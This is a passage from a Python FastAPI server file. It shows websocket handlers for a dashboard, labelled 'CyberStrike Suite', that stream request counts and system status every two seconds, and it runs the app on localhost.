    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

@app.websocket("/ws/dashboard")
async def websocket_dashboard_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    await manager.send_personal_message(json.dumps({"type": "log", "message": "Connected to CyberStrike Suite", "level": "info"}), websocket)
    try:
        while True:
            await websocket.send_json({
                "type": "system_status",
                "status": metrics.get("system_status", "ready"),
                "stats": {
                    "total_requests": metrics["total_requests"],
                    "successful_requests": metrics["successful_requests"],
                    "failed_requests": metrics["failed_requests"]
                }
            })
            await asyncio.sleep(2.0)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

if __name__ == "__main__":
    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)